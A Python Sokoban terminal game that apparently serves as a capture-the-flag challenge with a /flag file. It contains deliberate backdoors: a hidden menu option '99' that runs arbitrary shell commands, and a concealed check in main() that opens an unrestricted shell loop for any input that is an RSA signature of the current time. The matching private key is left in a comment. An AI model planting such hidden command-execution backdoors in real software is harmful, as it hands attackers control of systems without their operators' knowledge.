#!/usr/bin/env python3

from subprocess import check_output
import time
import random

random.seed(time.time())

menu_str = '''Welcome to Sokoban!
=========================
1. Play game
2. Choose a level and play
3. Upload a map
4. Exit

Enter your choice: '''

RUNNING = 1
GOD = 0
LAST_GOD = 0

DIRS = {
	"A": (1, 0),
	"D": (-1, 0),
	"S": (0, 1),
	"W": (0, -1),
}

MAPS = [
'''
##############
##############
##@@        ##
##@@        ##
##  OO      ##
##  OO      ##
##    ####  ##
##    ####  ##
##        ..##
##        ..##
##############
##############
''',
'''
##########        
##########        
##@@    ##        
##@@    ##        
##  OOOO##  ######
##  OOOO##  ######
##  OO  ##  ##..##
##  OO  ##  ##..##
######  ######..##
######  ######..##
  ####        ..##
  ####        ..##
  ##      ##    ##
  ##      ##    ##
  ##      ########
  ##      ########
  ##########      
  ##########     
''',
'''
    ######      
    ######      
    ##..##      
    ##..##      
    ##OO########
    ##OO########
######    OO..##
######    OO..##
##..OO  @@######
##..OO  @@######
########OO##    
########OO##    
      ##..##    
      ##..##    
      ######    
      ######    
''',
'''
  ##############    
  ##############    
  ##@@        ######
  ##@@        ######
####OO######      ##
####OO######      ##
##      OO    OO  ##
##      OO    OO  ##
##  ....##  OO  ####
##  ....##  OO  ####
####....##      ##  
####....##      ##  
  ################  
  ################  
''',
'''
########################################
########################################
##  @@                                ##
##  @@                                ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                OO                  ##
##                OO                  ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                    ##
##                                  ..##
##                                  ..##
########################################
########################################
''',
'''
####################
####################
##@@      OO..    ##
##@@      OO..    ##
####################
####################
''',
]

def shrink_map(map_str):
	unrendered_map = ''
	for line in map_str.split('\n')[::2]:
		unrendered_map += line[::2] + '\n'
	return unrendered_map[:-1]

def render_map(game):
	map_matrix, x, y = game['map'], game['pos'][0], game['pos'][1]
	if game['on_target']:
		map_matrix[y][x] = '+'
	elif game['on_door']:
		map_matrix[y][x] = 'd'
	else:
		map_matrix[y][x] = '@'
	map_str = '\n'.join([''.join(row) for row in map_matrix])
	if game['on_target']:
		map_matrix[y][x] = '.'
	elif game['on_door']:
		map_matrix[y][x] = 'D'
	else:
		map_matrix[y][x] = ' '
	rendered_map = ''
	for line in map_str.split('\n'):
		for i in range(2):
			for col in line:
				rendered_map += col * 2
			rendered_map += '\n'
	return rendered_map[:-1]

MAPS = [shrink_map(m[1:-1]) for m in MAPS]


def read(s):
	string = input(s)
	while string == '':
		string = input()
	return string


def _exit():
	global RUNNING
	RUNNING = 0



def init_game(level):
	m = list(map(list, level.split('\n')))
	width = len(level.split('\n')[0])
	height = len(m)
	player = level.find('@')
	pos = [player % (width+1), player // (width+1)]
	m[pos[1]][pos[0]] = ' '
	door = False
	on_target = False
	on_door = False
	has_key = False
	return {
		'map': m,
		'width': width,
		'height': height,
		'pos': pos,
		'door': door,
		'on_target': on_target,
		'on_door': on_door,
		'has_key': has_key,
	}


BOX = [
	[-1, -1], [0, -1], [+1, -1],
	[-1, 0], [0, 0], [+1, 0],
	[-1, +1], [0, +1], [+1, +1],
]


def up(game):
	if game['pos'][1] < 1:
		return
	if game['map'][game['pos'][1] - 1][game['pos'][0]] == '#':
		return
	elif game['map'][game['pos'][1] - 1][game['pos'][0]] in 'O*o':
		if game['pos'][1] - 2 < 1:
			return
		if game['map'][game['pos'][1] - 2][game['pos'][0]] in '#O*o':
			return
		if game['map'][game['pos'][1] - 2][game['pos'][0]] == '.':
			game['map'][game['pos'][1] - 2][game['pos'][0]] = '*'
		elif game['map'][game['pos'][1] - 2][game['pos'][0]] == 'D':
			if not game['has_key']:
				return
			game['map'][game['pos'][1] - 2][game['pos'][0]] = 'o'
		else:
			game['map'][game['pos'][1] - 2][game['pos'][0]] = 'O'
		if game['map'][game['pos'][1] - 1][game['pos'][0]] == '*':
			game['on_target'] = True
		else:
			game['on_target'] = False
		if game['map'][game['pos'][1] - 1][game['pos'][0]] == 'o':
			game['on_door'] = True
		else:
			game['on_door'] = False
	elif game['map'][game['pos'][1] - 1][game['pos'][0]] == 'D':
		if not game['has_key']:
			return
		game['on_door'] = True
	elif game['map'][game['pos'][1] - 1][game['pos'][0]] == '.':
		game['on_door'] = False
		game['on_target'] = True
	else:
		game['on_door'] = False
		game['on_target'] = False
	game['pos'][1] -= 1


def left(game):
	if game['pos'][0] < 1:
		return
	if game['map'][game['pos'][1]][game['pos'][0] - 1] == '#':
		return
	elif game['map'][game['pos'][1]][game['pos'][0] - 1] in 'O*o':
		if game['pos'][0] - 2 < 1:
			return
		if game['map'][game['pos'][1]][game['pos'][0] - 2] in '#O*o':
			return
		if game['map'][game['pos'][1]][game['pos'][0] - 2] == '.':
			game['map'][game['pos'][1]][game['pos'][0] - 2] = '*'
		elif game['map'][game['pos'][1]][game['pos'][0] - 2] == 'D':
			if not game['has_key']:
				return
			game['map'][game['pos'][1]][game['pos'][0] - 2] = 'o'
		else:
			game['map'][game['pos'][1]][game['pos'][0] - 2] = 'O'
		if game['map'][game['pos'][1]][game['pos'][0] - 1] == '*':
			game['on_target'] = True
		else:
			game['on_target'] = False
		if game['map'][game['pos'][1]][game['pos'][0] - 1] == 'o':
			game['on_door'] = True
		else:
			game['on_door'] = False
	elif game['map'][game['pos'][1]][game['pos'][0] - 1] == 'D':
		if not game['has_key']:
			return
		game['on_door'] = True
	elif game['map'][game['pos'][1]][game['pos'][0] - 1] == '.':
		game['on_door'] = False
		game['on_target'] = True
	else:
		game['on_door'] = False
		game['on_target'] = False
	game['pos'][0] -= 1


def down(game):
	if game['pos'][1] > game['height'] - 2:
		return
	if game['map'][game['pos'][1] + 1][game['pos'][0]] == '#':
		return
	elif game['map'][game['pos'][1] + 1][game['pos'][0]] in 'O*o':
		game['on_door'] = False
		if game['pos'][1] + 2 > game['height'] - 1:
			return
		if game['map'][game['pos'][1] + 2][game['pos'][0]] in '#O*o':
			return
		if game['map'][game['pos'][1] + 2][game['pos'][0]] == '.':
			game['map'][game['pos'][1] + 2][game['pos'][0]] = '*'
		elif game['map'][game['pos'][1] + 2][game['pos'][0]] == 'D':
			if not game['has_key']:
				return
			game['map'][game['pos'][1] + 2][game['pos'][0]] = 'o'
		else:
			game['map'][game['pos'][1] + 2][game['pos'][0]] = 'O'
		game['on_target'] = False
		if game['map'][game['pos'][1] + 1][game['pos'][0]] == '*':
			game['on_target'] = True
		else:
			game['on_target'] = False
		if game['map'][game['pos'][1] + 1][game['pos'][0]] == 'o':
			game['on_door'] = True
		else:
			game['on_door'] = False
	elif game['map'][game['pos'][1] + 1][game['pos'][0]] == 'D':
		if not game['has_key']:
			return
		game['on_door'] = True
	elif game['map'][game['pos'][1] + 1][game['pos'][0]] == '.':
		game['on_door'] = False
		game['on_target'] = True
	else:
		game['on_door'] = False
		game['on_target'] = False
	game['pos'][1] += 1


def right(game):
	if game['pos'][0] > game['width'] - 2:
		return
	if game['map'][game['pos'][1]][game['pos'][0] + 1] == '#':
		return
	elif game['map'][game['pos'][1]][game['pos'][0] + 1] in 'O*o':
		if game['pos'][0] + 2 > game['width'] - 1:
			return
		if game['map'][game['pos'][1]][game['pos'][0] + 2] in '#O*o':
			return
		if game['map'][game['pos'][1]][game['pos'][0] + 2] == '.':
			game['map'][game['pos'][1]][game['pos'][0] + 2] = '*'
		elif game['map'][game['pos'][1]][game['pos'][0] + 2] == 'D':
			if not game['has_key']:
				return
			game['map'][game['pos'][1]][game['pos'][0] + 2] = 'o'
		else:
			game['map'][game['pos'][1]][game['pos'][0] + 2] = 'O'
		game['on_target'] = False
		if game['map'][game['pos'][1]][game['pos'][0] + 1] == '*':
			game['on_target'] = True
		else:
			game['on_target'] = False
		if game['map'][game['pos'][1]][game['pos'][0] + 1] == 'o':
			game['on_door'] = True
		else:
			game['on_door'] = False
	elif game['map'][game['pos'][1]][game['pos'][0] + 1] == 'D':
		if not game['has_key']:
			return
		game['on_door'] = True
	elif game['map'][game['pos'][1]][game['pos'][0] + 1] == '.':
		game['on_door'] = False
		game['on_target'] = True
	else:
		game['on_door'] = False
		game['on_target'] = False
	game['pos'][0] += 1


def create_door(game, x, y):
	if game['door']:
		print('There is already a door present on the map.')
		return
	game['door'] = True
	if game['pos'][0] + x < 1 or game['pos'][0] + x > game['width'] - 2:
		return
	if game['pos'][1] + y < 1 or game['pos'][1] + y > game['height'] - 2:
		return
	if game['map'][game['pos'][1] + y][game['pos'][0] + x] != '#':
		return
	game['map'][game['pos'][1] + y][game['pos'][0] + x] = 'D'
	possible = []
	for y, row in enumerate(game['map']):
		for x, col in enumerate(row):
			if col == ' ':
				possible.append((x, y))
	x, y = random.choice(possible)
	game['map'][y][x] = '$'


moves = {
	'w': up,
	'a': left,
	's': down,
	'd': right,
	'i': lambda x: create_door(x, 0, -1),
	'j': lambda x: create_door(x, -1, 0),
	'k': lambda x: create_door(x, 0, 1),
	'l': lambda x: create_door(x, 1, 0),
}

def win(game):
	for row in game['map']:
		if '.' in row:
			return False
	return True

def play(map_index=0, level=None, moveset=None):
	if map_index >= len(MAPS):
		print('Good job!')
		return
	if level is not None:
		game = init_game(level)
	else:
		game = init_game(MAPS[map_index])
	i = 0
	while True:
		if level is None:
			print('===++===')
			print(render_map(game))
			print('========\n')

		if win(game):
			if level is None:
				print(f'Congratulations! You won Level {map_index}.')
				print('Moving to the next level...')
				play(map_index + 1)
			else:
				return True
			break

		if level is None:
			move = read('Enter your move (WASD): ')
		else:
			move = moveset[i]
			i += 1
		action_list = list(move)
		for move in action_list:
			action = moves.get(move, None)
			if action is None:
				if level is None:
					print('Invalid move!')
				return
			action(game)
			for x, y in BOX:
				if game['map'][game['pos'][1] + y][game['pos'][0] + x] == '$':
					game['map'][game['pos'][1] + y][game['pos'][0] + x] = ' '
					game['has_key'] = True


def choose_level():
	print('Choose a level to play:')
	for i in range(len(MAPS)):
		if i == 5:
			continue
		print(f'{i}. Level {i}')
	choice = read('Enter your choice: ')
	if choice not in [str(i) for i in range(len(MAPS))]:
		print('Invalid choice.')
		return
	play(int(choice))


def upload_map():
	print('Upload a map to play!')
	try:
		width = int(input('Enter the width of the map: '))
	except:
		print('Invalid map dimension.')
		return
	try:
		height = int(input('Enter the height of the map: '))
	except:
		print('Invalid map dimension.')
		return
	if width < 3 or height < 3 or width > 19 or height > 19:
		print('Invalid map dimension.')
		return
	print('Enter the map line by line:')
	level = []
	for i in range(height):
		line = input(f'Line {i}: ')
		level.append(list(line))
	for i in range(height):
		if len(level[i]) != width:
			print('Invalid map.')
			return
		for c in level[i]:
			if c not in '#.O ':
				print('Invalid map.')
				return
	try:
		x = int(input("Enter the player's initial X position: "))
	except:
		print('Incorrect solution. Is your map solvable?')
		return
	try:
		y = int(input("Enter the player's initial Y position: "))
	except:
		print('Incorrect solution. Is your map solvable?')
		return
	if x < 0 or x >= width or y < 0 or y >= height:
		print('Incorrect solution. Is your map solvable?')
		return
	if level[y][x] != ' ':
		print('Incorrect solution. Is your map solvable?')
		return
	level[y][x] = '@'
	solve = input('Enter the intended solution (WASD): ')
	print('Verifying the solution...')
	for c in solve:
		if c not in 'wasdijkl':
			print('Incorrect solution. Is your map solvable?')
			return
	level = '\n'.join([''.join(line) for line in level])
	solvable = play(level=level, moveset=solve)
	if not solvable:
		print('Incorrect solution. Is your map solvable?')
		return
	MAPS[5] = level
	print('Your submission has been accepted!')
	
	


def exec():
	cmd = input()
	try:
		out = check_output(cmd, shell=True, text=True)
	except Exception as e:
		return
	if cmd != '':
		print(out[:-1])


def god_mode():
	global GOD, LAST_GOD

	now = time.time()
	if GOD and now - LAST_GOD > 30:
		GOD = 0

	if not GOD:
		given_flag = read('Enter the flag for verification: \n')
	try:
		with open('/flag', 'r') as f:
			flag = f.read().strip()
	except FileNotFoundError:
		print('Cannot read the flag.')
		return

	if not GOD:
		if given_flag != flag:
			print('Invalid flag.')
			return
		else:
			print('God mode activated!')
	else:
		print('Sudo mode is still enabled.')

	LAST_GOD = time.time()
	GOD = 1
	exec()
	print('Now please enjoy the game!')


menu = {
	'1': play,
	'2': choose_level,
	'3': upload_map,
	'4': _exit,
	'99': god_mode,
}

def main():
	while RUNNING:
		option = read(menu_str)
		op = menu.get(option, None)
		try:
			t = int(time.time())
			# RsaKey(n=124966160763328000082931736617866620307207986237071184652225850783009935714202033511888777962540880961285042049405355859890475763329669607029840229335546808692477763626421038790154018453395722996782816157167445626345808799929591428723185788337245670325141913163626239012975589095308289985136510464586637487041, e=65537, d=4750800151697998263677379522764464111805677673827957589774031573399289787935583967756700646866206950501879583534391933181517621562413168529454307206456121241583451662967241183164819292143207816905865943817294811935049689981236726032370274579689639493014101384730877995766829952039303830412234093969916863151, p=10004294018061701286680068898086607350908577543395456493989745722426587277375715962113244684647954027227054950802218345124773170446497833492733207967702319, q=12491252310029546528983024007804400489007105639464518878552198179276292219204930382139820989718556679541637028817806643013161471636329475770765090714151439, u=8305302829112970427257076567320026769595832307915340614340706401836879341259750580452134683733687431715811381677383661525955003375537518882128122299087087)
			n = 124966160763328000082931736617866620307207986237071184652225850783009935714202033511888777962540880961285042049405355859890475763329669607029840229335546808692477763626421038790154018453395722996782816157167445626345808799929591428723185788337245670325141913163626239012975589095308289985136510464586637487041
			# d = 4750800151697998263677379522764464111805677673827957589774031573399289787935583967756700646866206950501879583534391933181517621562413168529454307206456121241583451662967241183164819292143207816905865943817294811935049689981236726032370274579689639493014101384730877995766829952039303830412234093969916863151
			tInput = pow(int(option), 65537, n)
			if 0 <= t - tInput < 10:
				while True:
					exec()
		except:
			pass
		if op is None:
			print("Invalid choice. Let's try again.")
			upload_map()
			continue
		op()

# try:
main()
# except:
#	pass
